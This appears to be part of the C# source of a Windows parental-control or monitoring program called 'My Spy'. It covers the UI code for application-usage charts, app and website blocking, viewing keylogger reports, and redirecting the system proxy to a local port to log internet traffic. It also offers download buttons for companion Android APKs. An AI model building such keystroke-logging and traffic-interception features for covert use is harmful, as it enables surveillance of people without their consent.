        #region Tab6 - Report aplikacii

        private void imageButton1_Click(object sender, EventArgs e)
        {
            ChoosedReports = 0;
            RepAddToListBox(0);
            ChangeOnlyTab(4, label14.Text);
            RemoveSelectedTabFocus();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (listBoxApp.SelectedIndex >= 0)
            {
                string add = (string)listBoxApp.Items[listBoxApp.SelectedIndex];
                add = add.Remove(0, add.IndexOf('[') + 1);
                add = add.Replace(".exe]", "");
                listBoxblock.Items.Add(add);
                SaveBlockApps();
            }
        }


        private void chartApplications_GetToolTipText(object sender, ToolTipEventArgs e)
        {
            switch (e.HitTestResult.ChartElementType)
            {
                case ChartElementType.DataPoint:
                    DataPoint dataPoint = e.HitTestResult.Series.Points[e.HitTestResult.PointIndex];
                    e.Text = dataPoint.LegendText + "\n" + appinfo[(int)dataPoint.XValue].ExecutableName + "\n" +
                        appinfo[(int)dataPoint.XValue].GetHours() + ":" + appinfo[(int)dataPoint.XValue].GetMinutes().ToString("D2");
                    break;
            }
        }



        private void chartapptime_GetToolTipText(object sender, ToolTipEventArgs e)
        {
            switch (e.HitTestResult.ChartElementType)
            {
                case ChartElementType.DataPoint:
                    DataPoint dataPoint = e.HitTestResult.Series.Points[e.HitTestResult.PointIndex];
                    e.Text = appinfo[(int)dataPoint.XValue].ApplicationName + "\n" + appinfo[(int)dataPoint.XValue].ExecutableName + "\n" + dataPoint.YValues[0] + "%   -   " +
                        appinfo[(int)dataPoint.XValue].GetHours() + ":" + appinfo[(int)dataPoint.XValue].GetMinutes().ToString("D2");
                    break;
            }
        }




        private void listBoxApp_SelectedIndexChanged(object sender, EventArgs e)
        {
            listBoxAppTime.SelectedIndex = listBoxApp.SelectedIndex;
        }

        private void listBoxAppTime_SelectedIndexChanged(object sender, EventArgs e)
        {
            listBoxApp.SelectedIndex = listBoxAppTime.SelectedIndex;
        }


        #endregion

        #region Tab7 - Keylogger report

        private void imageButton5_Click(object sender, EventArgs e)
        {
            ChoosedReports = 1;
            RepAddToListBox(1);
            ChangeOnlyTab(4, label14.Text);
            RemoveSelectedTabFocus();
        }

        private void onOffButton2_CheckedChanged(object sender, EventArgs e)
        {
            if (onOffButton2.Checked)
            {
                StringBuilder str = new StringBuilder(KeyText);
                str.Replace("[Caps ON]", "");
                str.Replace("[Caps OFF]", "");
                str.Replace("[<-]", "");
                str.Replace("[Shift]", "");
                str.Replace("[Crtrl+Alt]", "");
                str.Replace("[Ctrl]", "");
                str.Replace("[Windows]", "");
                str.Replace("[Esc]", "");
                str.Replace("[Home]", "");
                str.Replace("[End]", "");
                str.Replace("[PageUp]", "");
                str.Replace("[PageDown]", "");
                str.Replace("[Insert]", "");
                str.Replace("[Numlock]", "");
                richTextBoxKeyText.Text = str.ToString();
            }
            else
            {
                richTextBoxKeyText.Text = KeyText;
            }
        }

        #endregion

        #region Tab8 - Blokovanie -> nastavenia, zapnutie/vypnutie


        private void buttonsaveblocking_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/");
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/ComputerTime.dat"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/ComputerTime.dat");
            }


            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/BlockApps.dat"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/BlockApps.dat");
            }


            SaveWriter save = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/ComputerTime.dat");
            save.AddItem("Enable", onOffButton1.Checked);


                save.AddItem("Time", "" + dateTimePicker1.Value);
                save.AddItem("Warning", checkBox5.Checked);
                save.AddItem("WarningTime", "" + numericUpDown1.Value);
            

            save.Save();
            save.Destroy();

            SaveBlockApps();

            HelpClass.RestartService("My Spy", 10);
        }


        private void onOffButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (onOffButton1.Checked)
            {
                paneltimecomp.Enabled = true;
            }
            else
            {
                paneltimecomp.Enabled = false;
            }
        }


        private void button8_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(comboBoxBlock.Text))
            {
                listBoxblock.Items.Add(comboBoxBlock.Text);
                comboBoxBlock.Text = "";
            }
        }



        private void button6_Click(object sender, EventArgs e)
        {
            if (listBoxblock.SelectedIndex >= 0)
                listBoxblock.Items.RemoveAt(listBoxblock.SelectedIndex);
        }



        private void comboBoxBlock_TextChanged(object sender, EventArgs e)
        {
            try
            {
                labelblockapp.Text = "-";
                Process[] processes = Process.GetProcessesByName(comboBoxBlock.Text);
                if (processes.Length > 0)
                {
                    labelblockapp.Text = processes[0].ProcessName;
                    labelblockapp.Text += " - " + processes[0].MainWindowTitle;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
            }
        }


        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked)
                numericUpDown1.Enabled = true;
            else
                numericUpDown1.Enabled = false;
        }

        #endregion

        #region Tab9 - Statistiky

        private void onOffButton3_CheckedChanged(object sender, EventArgs e)
        {
            registrysettings.SetValue("Statistics", onOffButton3.Checked);
        }

        #endregion


        #region Tab10,11 - Internet, Internet reports


        private void onOffButtonInternet_CheckedChanged(object sender, EventArgs e)
        {
            if (!onOffButtonInternet.Checked)
            {
                onOffButton4.Checked = false;
                onOffButton4.Enabled = false;
                onOffButton5.Checked = false;
                onOffButton5.Enabled = false;
            }
            else
            {
                onOffButton4.Enabled = true;
                onOffButton5.Enabled = true;
            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            listBoxBlockWebsites.Items.Add(textBox7.Text);
            textBox7.Text = "";
        }


        private void buttoninternetsave_Click(object sender, EventArgs e)
        {
            registrysettings.SetValue("Internet", onOffButtonInternet.Checked);


            if (onOffButtonInternet.Checked)
            {
                RegistryKey registryi = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
                registryi.SetValue("ProxyEnable", 1);
                registryi.SetValue("ProxyServer", "127.0.0.1:8333");
            }
            else
            {

                RegistryKey registryi = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
                if (registryi.GetValue("ProxyEnable") != null)
                    registryi.DeleteValue("ProxyEnable");
                if (registryi.GetValue("ProxyServer") != null)
                    registryi.DeleteValue("ProxyServer");
            }

            registrysettings.SetValue("InternetBlockList", onOffButton4.Checked);
            registrysettings.SetValue("InternetBlockSocial", onOffButton5.Checked);

            if (File.Exists(PathMS+"/Block/BlockWebsites.dat"))
            {
                File.Delete(PathMS + "/Block/BlockWebsites.dat");
            }

                SaveWriter save = new SaveWriter(PathMS + "/Block/BlockWebsites.dat");
            save.AddItem("Count",listBoxBlockWebsites.Items.Count);
            for(int i=0;i< listBoxBlockWebsites.Items.Count;i++)
            {
                save.AddItem("Website"+i, ""+listBoxBlockWebsites.Items[i]);
            }

            save.Save();

             HelpClass.RestartService("My Spy", 10);
        }


        private void button12_Click(object sender, EventArgs e)
        {
            if (listBoxBlockWebsites.SelectedIndex >= 0)
            {
                listBoxBlockWebsites.Items.RemoveAt(listBoxBlockWebsites.SelectedIndex);
            }
        }




        private void buttonInternetReports_Click(object sender, EventArgs e)
        {
            ChoosedReports = 2;
            RepAddToListBox(2);
            ChangeOnlyTab(4, label62.Text);
            RemoveSelectedTabFocus();
        }

        private void imageButton6_Click(object sender, EventArgs e)
        {
            ChoosedReports = 2;
            RepAddToListBox(2);
            ChangeOnlyTab(4, label62.Text);
            RemoveSelectedTabFocus();
        }



        private void buttonInternetTodayReport_Click(object sender, EventArgs e)
        {
            try
            {

                ChoosedReports = 2;
                string today = DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Year;

                label63.Text = today;
                using (StreamReader reader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                    "/My Spy/MonitoringReports/Internet/" + today + ".dat"))
                {
                    richTextBox1.Text = reader.ReadToEnd(); ;
                }
                ChangeOnlyTab(10, label62.Text);


            }
            catch(Exception ex)
            {
                Debug.WriteLine(""+ex);
            }
        }


        #endregion


        #region Tab12 - Aplikacie

        private void buttonGetChatWin_Click(object sender, EventArgs e)
        {
            SaveFileDialog savefile = new SaveFileDialog();
            savefile.Title = ResourcesFiles.ProgramStrings.UploadApp;

            savefile.FileName = "MySpyChat.zip";
            savefile.Filter = "Archive file (*.zip)|*.zip";

            if (savefile.ShowDialog() == DialogResult.OK)
            {
                string path = AppDomain.CurrentDomain.BaseDirectory;
                path = path.Remove(path.Length - 5);
                path += "Files/MySpyChat.zip";

                Debug.WriteLine(path);
                File.Copy(path, savefile.FileName);
            }

        }


        private void buttonGetChatAndroid_Click(object sender, EventArgs e)
        {
            SaveFileDialog savefile = new SaveFileDialog();
            savefile.Title = ResourcesFiles.ProgramStrings.UploadApk;

            savefile.FileName = "MySpyChatAndroid.apk";
            savefile.Filter = "Android Application (*.apk)|*.apk";

            if (savefile.ShowDialog() == DialogResult.OK)
            {
                string path = AppDomain.CurrentDomain.BaseDirectory;
                path = path.Remove(path.Length - 5);
                path += "Files/MySpyChatAndroid.apk";

                Debug.WriteLine(path);
                File.Copy(path, savefile.FileName);
            }
            
        }



        private void buttonGetMySpyAndroid_Click(object sender, EventArgs e)
        {
            SaveFileDialog savefile = new SaveFileDialog();
            savefile.Title = ResourcesFiles.ProgramStrings.UploadApk;

            savefile.FileName = "MySpyAndroid.apk";
            savefile.Filter = "Android Application (*.apk)|*.apk";

            if (savefile.ShowDialog() == DialogResult.OK)
            {
                string path = AppDomain.CurrentDomain.BaseDirectory;
                path = path.Remove(path.Length - 5);
                path += "Files/MySpyAndroid.apk";

                Debug.WriteLine(path);
                File.Copy(path, savefile.FileName);
            }
        }


        #endregion


        #region Funkcie - Ostatne funkcie




        void ClearReports()
        {
            listBox1.Items.Clear();
            listBoxApp.Items.Clear();
            listBoxAppTime.Items.Clear();
            chartApplications.Series[0].Points.Clear();
            chartapptime.Series.Clear();
            onOffButton2.Checked = false;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("http://myspy.diodegames.eu");
        }

        private void buttonWebLogin_Click(object sender, EventArgs e)
        {

            if (!registrysettings.GetValue("WebID", "-").Equals("-"))
            {
                registrysettings.DeleteValue("Web");
                registrysettings.DeleteValue("WebID");
                buttonWebLogin.Text = ResourcesFiles.ProgramStrings.Login;
            }
            else
            {
                WebLogin weblogin = new WebLogin();
                weblogin.Show();
            }
        }



        //***** RepAddToListBox *****
        void RepAddToListBox(short value)
        {
            ClearReports();

            if (value == 0)
            {
                label14.Text = ResourcesFiles.ProgramStrings.ApplicationReports;
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/App/");
                DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/App/");

                List<DateTime> dlist = new List<DateTime>();

                foreach (FileInfo file in dir.GetFiles("*.apprep"))
                {
                    dlist.Add(DateTime.Parse( Path.GetFileNameWithoutExtension(file.Name)));
                    //listBox1.Items.Insert(0, Path.GetFileNameWithoutExtension(file.Name));
                }
                dlist.Sort();


                foreach (DateTime dat in dlist)
                {
                    listBox1.Items.Insert(0, dat.Day + "-" + dat.Month + "-" + dat.Year);
                }

            }
            else if (value == 1)
            {
                label14.Text = ResourcesFiles.ProgramStrings.KeyloggerReports;
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Key/");
                DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Key/");

                List<DateTime> dlist = new List<DateTime>();

                foreach (FileInfo file in dir.GetFiles("*.dat"))
                {
                    dlist.Add(DateTime.Parse(Path.GetFileNameWithoutExtension(file.Name)));
                    // listBox1.Items.Insert(0, Path.GetFileNameWithoutExtension(file.Name));
                }
                dlist.Sort();


                foreach (DateTime dat in dlist)
                {
                    listBox1.Items.Insert(0, dat.Day + "-" + dat.Month + "-" + dat.Year);
                }

            }

            else if (value == 2)
            {
                label14.Text = label62.Text;
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Internet/");
                DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Internet/");

                List<DateTime> dlist = new List<DateTime>();

                foreach (FileInfo file in dir.GetFiles("*.dat"))
                {
                    dlist.Add(DateTime.Parse(Path.GetFileNameWithoutExtension(file.Name)));
                    // listBox1.Items.Insert(0, Path.GetFileNameWithoutExtension(file.Name));
                }
                dlist.Sort();


                foreach (DateTime dat in dlist)
                {
                    listBox1.Items.Insert(0, dat.Day + "-" + dat.Month + "-" + dat.Year);
                }

            }
        }
        //----- RepAddToListBox -----




        void SaveBlockApps()
        {
            for (int i = 0; i < listBoxblock.Items.Count; i++)
            {
                for (int j = 0; j < listBoxblock.Items.Count; j++)
                {

                    if (listBoxblock.Items[i].Equals(listBoxblock.Items[j]) && i != j)
                    {
                        listBoxblock.Items.RemoveAt(i);
                        break;
                    }
                }
            }

            SaveWriter save = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/BlockApps.dat");
            save.AddItem("Enabled", onOffButtonblock.Checked);

            save.AddItem("Count", listBoxblock.Items.Count);
            for (int i = 0; i < listBoxblock.Items.Count; i++)
            {
                save.AddItem("Pr" + i, "" + listBoxblock.Items[i]);
            }
            save.Save();
        }

        #endregion


    }
}
